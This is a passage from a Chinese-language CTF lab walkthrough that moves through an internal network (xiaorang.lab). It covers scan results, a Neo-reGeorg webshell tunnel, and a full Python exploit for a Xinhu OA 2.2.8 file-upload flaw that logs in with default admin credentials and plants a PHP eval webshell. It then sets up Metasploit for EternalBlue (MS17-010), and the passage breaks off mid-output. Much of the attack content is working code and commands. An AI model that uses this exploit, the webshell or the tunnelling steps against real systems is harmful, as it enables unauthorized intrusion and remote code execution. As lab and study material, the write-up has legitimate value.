MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)<br>[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393<br>[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)<br>[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600<br>[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1<br>[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login<br>[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统<br>[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1<br></code></pre></td></tr></table></figure><p>得出如下信息：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.2</span>   DC域控制器<br><span class="hljs-number">172.22.1.21</span>  MS17-<span class="hljs-number">010</span>永恒之蓝<br><span class="hljs-number">172.22.1.18</span>  信呼OA系统<br></code></pre></td></tr></table></figure><p>我们需要内网穿透才能对这些内网ip进行操作</p><p>我使用的是<a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a>这款内网渗透工具</p><p>与frp相比Neo-reGeorg不需要公网ip</p><p>先生成Neo-reGeorg的webshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\tools\Neo<span class="hljs-literal">-reGeorg-5</span>.<span class="hljs-number">2.0</span>&gt; python neoreg.py generate <span class="hljs-literal">-k</span> password     <span class="hljs-comment">#password为用于连接认证的自定义的密码</span><br><br><br>          <span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;  &#x27;M<span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@m</span><br><span class="hljs-string">        :<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">       &#x27;<span class="hljs-variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span>&amp;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                 <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  J<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                m<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>,</span><br><span class="hljs-string">                <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>          Neo-reGeorg</span><br><span class="hljs-string">             &#x27;1t<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27; &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&lt;</span><br><span class="hljs-string">          &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>          version 5.2.0</span><br><span class="hljs-string">               &#x27;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@</span><br><span class="hljs-string">             &#x27;z<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                r<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>   <span class="hljs-variable">$</span><span class="hljs-variable">$</span>|</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> c<span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">               &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> <span class="hljs-variable">$</span><span class="hljs-variable">$v</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>#</span><br><span class="hljs-string">               <span class="hljs-variable">$</span><span class="hljs-variable">$x</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$twelve</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@<span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">             @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@L &#x27;    &#x27;&lt;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>`</span><br><span class="hljs-string">           <span class="hljs-variable">$</span><span class="hljs-variable">$</span>                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span><br><span class="hljs-string"></span><br><span class="hljs-string">    [+] Mkdir a directory: neoreg_servers</span><br><span class="hljs-string">    [+] Create neoreg server files:</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.ashx</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.aspx</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.go</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.jsp</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.jspx</span><br><span class="hljs-string">       =&gt; neoreg_servers/tunnel.php</span><br><span class="hljs-string">       </span><br></code></pre></td></tr></table></figure><p>在neoreg_servers文件夹中生成了各种语言的webshell</p><p>由于靶机使用的是php，我们只需将<code>tunnel.php</code>上传到靶机上的web服务目录（<code>/var/www/html</code>）</p><p>然后在本机执行命令进行连接：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python neoreg.py <span class="hljs-literal">-k</span> password <span class="hljs-literal">-u</span> http://xx/tunnel.php   <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Hesyer\Desktop\道具\Neo<span class="hljs-literal">-reGeorg-5</span>.<span class="hljs-number">2.0</span>&gt; python neoreg.py <span class="hljs-literal">-k</span> password <span class="hljs-literal">-u</span> http://<span class="hljs-number">39.98</span>.<span class="hljs-number">117.52</span>/tunnel.php<br><br><br>          <span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;  &#x27;M<span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@m</span><br><span class="hljs-string">        :<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">       &#x27;<span class="hljs-variable">$</span>&#x27;    &#x27;JZI&#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span>&amp;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                 <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  J<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                m<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>,</span><br><span class="hljs-string">                <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>          Neo-reGeorg</span><br><span class="hljs-string">             &#x27;1t<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27; &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&lt;</span><br><span class="hljs-string">          &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>          version 5.2.0</span><br><span class="hljs-string">               &#x27;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;  <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@</span><br><span class="hljs-string">             &#x27;z<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>  @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">                r<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>   <span class="hljs-variable">$</span><span class="hljs-variable">$</span>|</span><br><span class="hljs-string">                &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> c<span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string">               &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$v</span> <span class="hljs-variable">$</span><span class="hljs-variable">$v</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>#</span><br><span class="hljs-string">               <span class="hljs-variable">$</span><span class="hljs-variable">$x</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$twelve</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@<span class="hljs-variable">$</span>&#x27;</span><br><span class="hljs-string">             @<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>@L &#x27;    &#x27;&lt;@<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>`</span><br><span class="hljs-string">           <span class="hljs-variable">$</span><span class="hljs-variable">$</span>                 &#x27;<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span><br><span class="hljs-string"></span><br><span class="hljs-string">+------------------------------------------------------------------------+</span><br><span class="hljs-string">  Log Level set to [ERROR]</span><br><span class="hljs-string">  Starting SOCKS5 server [127.0.0.1:1080]</span><br><span class="hljs-string">  Tunnel at:</span><br><span class="hljs-string">    http://39.98.117.52/tunnel.php</span><br><span class="hljs-string">+------------------------------------------------------------------------+</span><br></code></pre></td></tr></table></figure><p>在代理工具proxifier上配置 socks5 代理即可</p><p>现在，我们可以访问上述内网ip了</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>访问之前fscan扫描到的信呼协同办公系统<code>172.22.1.18</code></p><p>可以看到版本为2.2.8</p><p>搜索可知该版本存在文件上传漏洞，获取exp并利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#需要在同目录下放置一个名为&quot;1.php&quot;的php一句话木马</span><br><span class="hljs-keyword">import</span> requests<br><br><br>session = requests.session()<br><br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br><br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br><br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 1.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;1&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行exp即可获得文件上传的路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Hesyer\Desktop\道具\脚本&gt; python <span class="hljs-literal">-u</span> <span class="hljs-string">&quot;c:\Users\Hesyer\Desktop\道具\脚本\exp.py&quot;</span><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined offset: <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> &lt;b&gt;C:\phpStudy\PHPTutorial\WWW\upload\<span class="hljs-number">2024</span><span class="hljs-literal">-10</span>\<span class="hljs-number">27</span>_17552986.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">1</span>&lt;/b&gt;&lt;br /&gt;<br></code></pre></td></tr></table></figure><p>拼接路径后url为<code>http://172.22.1.18/upload/2024-10/27_17552986.php</code></p><p>然后用蚁剑连接</p><p>在<code>Administrator</code>用户目录下找到 flag2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">C:/Users/Administrator/flag/flag02.txt</span><br>___    ___ ___  ________  ________  ________  ________  ________   ________     <br>|\  \  /  /|\  \|\   __  \|\   __  \|\   __  \|\   __  \|\   ___  \|\   ____\    <br>\ \  \/  / | \  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|    <br> \ \    / / \ \  \ \   __  \ \  \\\  \ \   _  _\ \   __  \ \  \\ \  \ \  \  ___  <br>  /     \/   \ \  \ \  \ \  \ \  \\\  \ \  \\  \\ \  \ \  \ \  \\ \  \ \  \|\  \ <br> /  /\   \    \ \__\ \__\ \__\ \_______\ \__\\ _\\ \__\ \__\ \__\\ \__\ \_______\<br>/__/ /\ __\    \|__|\|__|\|__|\|_______|\|__|\|__|\|__|\|__|\|__| \|__|\|_______|<br>|__|/ \|__|                                                                      <br><br><br>flag02: 2ce3-4813-87d4-<br><br>Awesome! ! ! You found the second flag, now you can attack the domain controller.<br></code></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来在kali中使用<code>Metasploit Framework</code>攻击存在<code>ms17-010</code>(永恒之蓝)的<code>172.22.1.21</code></p><p>首先在kali里配置<code>proxychains4</code>(linux命令行代理神器)</p><p>在<code>/etc/proxychains4.conf</code>文件中最下面的ProxyList上加上<code>socks5 ip 端口</code> 即可</p><p>这里的IP是vm虚拟机nat模式(我的kali的虚拟机网络连接模式)下本机的ip</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[ProxyList]</span><br>socks5 192.168.241.1 1080<br></code></pre></td></tr></table></figure><p>vm虚拟机nat模式下本机的ip可以在本机中用<code>ipconfig</code>命令查看，在<code>VMware Network Adapter VMnet8</code>里</p><p><em>这里最好测试一下kali虚拟机能否ping通这个ip，如果ping不通，上面设置的代理是无效的，</em></p><blockquote><p>解决方法是打开Windows防火墙—–&gt;高级设置—–&gt;入站规则，找到配置文件类型为“公用”的“文件和打印共享（回显请求 – ICMPv4-In）”规则，设置为允许</p></blockquote><p>然后命令行执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 -q bash<br></code></pre></td></tr></table></figure><p>这将以静默模式打开一个新的 <code>bash</code> 会话，所有在这个会话中输入的命令都将自动通过 <code>proxychains4</code> 代理执行，</p><p>静默模式下proxychains4的大量初始化信息将被隐藏</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># msfconsole</span><br>Metasploit tip: Use <span class="hljs-built_in">help</span> &lt;<span class="hljs-built_in">command</span>&gt; to learn more about any <span class="hljs-built_in">command</span><br>                                                  <br><br>      .:okOOOkdc<span class="hljs-string">&#x27;           &#x27;</span>cdkOOOko:.<br>    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.<br>   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:<br>  <span class="hljs-string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span><br>  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo<br>  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx<br>  lOOOOOOOO.         ;d;         ,OOOOOOOOl<br>  .OOOOOOOO.   .;           ;    ,OOOOOOOO.<br>   cOOOOOOO.   .OOc.     <span class="hljs-string">&#x27;oOO.   ,OOOOOOOc</span><br><span class="hljs-string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo</span><br><span class="hljs-string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl</span><br><span class="hljs-string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;<br>       .dOOo   .OOOOocccxOOOO.   xOOd.<br>         ,kOl  .OOOOOOOOOOOOO. .dOk,<br>           :kk;.OOOOOOOOOOOOO.cOk:<br>             ;kOOOOOOOOOOOOOOOk:<br>               ,xOOOOOOOOOOOx,<br>                 .lOOOOOOOl.<br>                    ,dOd,<br>                      .<br><br>       =[ metasploit v6.4.32-dev                          ]<br>+ -- --=[ 2459 exploits - 1266 auxiliary - 430 post       ]<br>+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search ms17-010<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                           Disclosure Date  Rank     Check  Description</span><br>   -   ----                                           ---------------  ----     -----  -----------<br>   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption<br>   1     \_ target: Automatic Target                  .                .        .      .<br>   2     \_ target: Windows 7                         .                .        .      .<br>   3     \_ target: Windows Embedded Standard 7       .                .        .      .<br>   4     \_ target: Windows Server 2008 R2            .                .        .      .<br>   5     \_ target: Windows 8                         .                .        .      .<br>   6     \_ target: Windows 8.1                       .                .        .      .<br>   7     \_ target: Windows Server 2012               .                .        .      .<br>   8     \_ target: Windows 10 Pro                    .                .        .      .<br>   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .<br>   10  